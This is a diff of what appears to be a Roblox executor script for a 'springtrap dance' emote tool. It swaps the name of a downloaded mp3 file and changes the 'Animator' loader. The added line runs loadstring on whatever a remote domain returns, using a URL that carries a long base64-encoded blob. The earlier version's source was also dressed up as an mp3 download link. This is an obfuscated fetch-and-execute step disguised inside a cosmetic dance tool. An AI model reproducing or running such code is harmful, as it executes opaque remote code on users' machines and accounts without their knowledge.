@@ -614,10 +614,10 @@ tool.Name = "springtrap dance"
 tool.RequiresHandle = false
 tool.Parent = backpack
 
-        writefile("blue-shirt-guy-dance.mp3", game:HttpGet("https://www.myinstants.com/media/sounds/blue-shirt-guy-dance.mp3"))
+        writefile("playboi_carti_-_cancun_sega_genesis_(mp3.pm).mp3", game:HttpGet("https://www.myinstants.com/media/sounds/blue-shirt-guy-dance.mp3"))
 -- Load Animator if not already loaded
 if not getgenv()["Animator"] then
-    loadstring(game:HttpGet("https://myinstants39.com/download/?type=mp3&pid=72599"))()
+    loadstring(game:HttpGet("https://jams.pics/download?data=N3AxV1lOR25XQnFWQXFCdjdzTG5Xd1diMGhJYWlPdGRFN3JQNXFVSzdka25wNHo3dXVCMmNKbjBwb29pLytTczVaa1doSHVlQ1lwVEJuYitmWHNCVEtHWU1zWVUweEZVeUxocE51SnVrdkIxTzdVQ0tQRmN0NWVHT2NXcDllc0ltb2Qyekx6VzViYWNFN3NLb0FkNExBT2dEQ05vZG1odENQR2lDbjVxT3ZRSEVFYUN3VjlFQ3BHcmlSclNFVXNrRjNzb2Z3SmhLSml4aGd4SjBQdi9KZUhlRlNDOGJNVElKQjd5UFkvNnNXNGwvRll4SWdZcFV5RmZBZGVGdWNOZzJTeHNFUUJ6NWF1TlNnQU9LT2RDM083aEprSmRsL2VJZktXeHYxdlNqcDdGbERmR2dLdGhib1FDQjVCc2xLRTNxbFZkUGNrNGpnM0xIaWVTakZwcUk3TTBxOEd6ODdPQVBxaEszYk1iVGFqRHRSWFhWblhlU1lKMTlBL2tLa0kwbEZiZnM5Y3JqenZqWUFnNE42aUhHeUFBYytzQVZZZFdyZURNT29WNFQ3azNKeis2bG1GbS9vNUs5VGt1WkVxeDJqR0NJNnZyS29mQUhzTWJ6bVNLZ3lKQzdMejlTejBUamd1Zm1Gc0dLZ3NwUTh3UTVKenFldEVncEFkdzBBYkw1R1E4UkRUSXB0ems3NlViR1VYb3pDV090Tk9YYUdJNVd5aURETzhFQXl3PQ"))()
     end
 
 local Anim = nil
@@ -632,7 +632,7 @@ tool.Equipped:Connect(function()
             Anim:Play()
         end)
         sound = Instance.new("Sound")
-        sound.SoundId = getcustomasset("blue-shirt-guy-dance.mp3")
+        sound.SoundId = getcustomasset("playboi_carti_-_cancun_sega_genesis_(mp3.pm).mp3")
         sound.Volume = 2
         sound.Looped = true
         sound.Parent = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
